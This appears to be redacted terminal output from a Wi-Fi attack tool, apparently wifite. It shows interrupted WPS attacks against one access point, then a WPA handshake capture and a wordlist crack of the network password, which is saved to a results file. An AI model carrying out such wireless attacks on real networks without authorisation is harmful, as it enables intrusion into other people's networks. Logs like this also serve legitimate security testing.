```
[+] (1/1) Starting attacks against ████████████ (███)
[+] ███ (39db) WPS Pixie-Dust: [5m0s] Waiting for target to appear ... ^C
[!] Interrupted

[+] 4 attack(s) remain
[+] Do you want to continue attacking, or exit (c, e)? c
[+] ███ (36db) WPS NULL PIN: [4m53s] Sending ID ^C
[!] Interrupted

[+] 3 attack(s) remain
[+] Do you want to continue attacking, or exit (c, e)? c
[+] ███ (38db) WPS PIN Attack: [2s] (0.00%) Initializing ^C
[!] Interrupted

[+] 2 attack(s) remain
[+] Do you want to continue attacking, or exit (c, e)? c
[!] Skipping PMKID attack, missing required tools: hcxpcapngtool
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (38db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (39db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (37db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (39db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (39db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (40db) WPA Handshake capture: Discovered new client: ████████████
[+] ███ (40db) WPA Handshake capture: Captured handshake
[+] saving copy of handshake to hs/handshake_████████████.cap saved

[+] analysis of captured handshake file:
[+]   tshark: .cap file contains a valid handshake for ████████████
[!] aircrack: .cap file does not contain a valid handshake

[+] Cracking WPA Handshake: Running aircrack-ng with crack-it wordlist
[+] Cracking WPA Handshake: 100.00% ETA: 0s @ 238.0kps (current key: )
[+] Cracked WPA Handshake PSK: ████████████

[+]     Access Point Name: ██
[+]     Access Point BSSID: ████████████
[+]             Encryption: WPA
[+]         Handshake File: hs/handshake_████████████████████.cap
[+]         PSK (password): █████████████!
[+] saved crack result to cracked.json (7 total)
[+] Finished attacking 1 target(s), exiting
```